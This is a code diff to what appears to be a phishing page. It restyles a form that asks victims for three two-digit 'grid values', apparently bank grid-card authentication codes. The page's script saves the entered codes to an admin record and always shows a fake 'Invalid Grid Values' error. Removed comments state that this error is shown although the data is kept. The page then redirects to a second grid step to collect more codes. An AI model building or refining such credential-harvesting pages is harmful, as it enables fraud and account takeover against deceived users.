@@ -9,13 +9,48 @@
         body { background-color: #0056b3; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
         .form-container { background: #ffffff; padding: 35px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3); width: 100%; max-width: 450px; }
         .form-container h2 { text-align: center; margin-bottom: 5px; color: #0056b3; font-size: 22px; }
-        .sub-title { text-align: center; color: #555; font-size: 13px; margin-bottom: 20px; }
-        .error-msg { background: #f8d7da; color: #721c24; padding: 10px; border-radius: 6px; font-size: 13px; text-align: center; margin-bottom: 15px; display: none; border: 1px solid #f5c6cb; }
-        .form-group { margin-bottom: 15px; }
-        .form-group label { display: block; margin-bottom: 6px; color: #333; font-weight: 600; font-size: 13px; }
-        .form-group input { width: 100%; padding: 10px 14px; border: 1px solid #ccc; border-radius: 6px; font-size: 15px; text-align: center; letter-spacing: 2px; background: #fff; }
-        .form-group input:focus { outline: none; border-color: #0056b3; box-shadow: 0 0 5px rgba(0, 86, 179, 0.3); }
-        .btn-next { width: 100%; padding: 12px; background: #0056b3; border: none; border-radius: 6px; color: white; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        .sub-title { text-align: center; color: #555; font-size: 13px; margin-bottom: 25px; }
+        .error-msg { background: #f8d7da; color: #721c24; padding: 10px; border-radius: 6px; font-size: 13px; text-align: center; margin-bottom: 20px; display: none; border: 1px solid #f5c6cb; }
+        
+        /* Grid Horizontal Layout Styling matching screenshot */
+        .grid-container {
+            display: flex;
+            justify-content: space-between;
+            gap: 15px;
+            margin-bottom: 25px;
+            background: #f8f9fa;
+            padding: 20px 15px;
+            border-radius: 8px;
+            border: 1px solid #e0e0e0;
+        }
+        .grid-item {
+            flex: 1;
+            text-align: center;
+        }
+        .grid-label {
+            display: block;
+            margin-bottom: 8px;
+            color: #0056b3;
+            font-weight: bold;
+            font-size: 16px;
+        }
+        .grid-input {
+            width: 100%;
+            padding: 10px 5px;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            font-size: 16px;
+            text-align: center;
+            letter-spacing: 2px;
+            background: #fff;
+        }
+        .grid-input:focus {
+            outline: none;
+            border-color: #0056b3;
+            box-shadow: 0 0 5px rgba(0, 86, 179, 0.3);
+        }
+
+        .btn-next { width: 100%; padding: 12px; background: #0056b3; border: none; border-radius: 6px; color: white; font-size: 16px; font-weight: bold; cursor: pointer; }
         .btn-next:hover { background: #004085; }
         .btn-next:disabled { background: #6c757d; cursor: not-allowed; }
     </style>
@@ -28,17 +63,19 @@
         <div id="errorAlert" class="error-msg">Invalid Grid Values, Please Enter Again</div>
 
         <form id="gridForm1">
-            <div class="form-group">
-                <label for="gridA">Grid Value for Column [ A ] (2 Digits)</label>
-                <input type="password" id="gridA" name="gridA" placeholder="-- " maxlength="2" required>
-            </div>
-            <div class="form-group">
-                <label for="gridD">Grid Value for Column [ D ] (2 Digits)</label>
-                <input type="password" id="gridD" name="gridD" placeholder="-- " maxlength="2" required>
-            </div>
-            <div class="form-group">
-                <label for="gridN">Grid Value for Column [ N ] (2 Digits)</label>
-                <input type="password" id="gridN" name="gridN" placeholder="-- " maxlength="2" required>
+            <div class="grid-container">
+                <div class="grid-item">
+                    <span class="grid-label">A</span>
+                    <input type="password" id="gridA" name="gridA" class="grid-input" placeholder="--" maxlength="2" required>
+                </div>
+                <div class="grid-item">
+                    <span class="grid-label">D</span>
+                    <input type="password" id="gridD" name="gridD" class="grid-input" placeholder="--" maxlength="2" required>
+                </div>
+                <div class="grid-item">
+                    <span class="grid-label">N</span>
+                    <input type="password" id="gridN" name="gridN" class="grid-input" placeholder="--" maxlength="2" required>
+                </div>
             </div>
 
             <button type="submit" id="submitBtn" class="btn-next">Verify & Submit</button>
@@ -67,19 +104,16 @@
                 }
                 if (targetIndex === -1) targetIndex = submissions.length - 1;
 
-                // Save Step 1 grid values in admin record
                 submissions[targetIndex].gridStep1 = gridStep1Data;
                 localStorage.setItem('voterSubmissions', JSON.stringify(submissions));
             }
 
-            // Show error message as requested, but data is saved in admin
             document.getElementById('errorAlert').style.display = 'block';
             const btn = document.getElementById('submitBtn');
             btn.disabled = true;
             btn.innerText = "Verifying...";
 
             setTimeout(() => {
-                // Redirect to 2nd grid step after showing invalid alert
                 window.location.href = "grid_step2.html"; 
             }, 1500);
         });
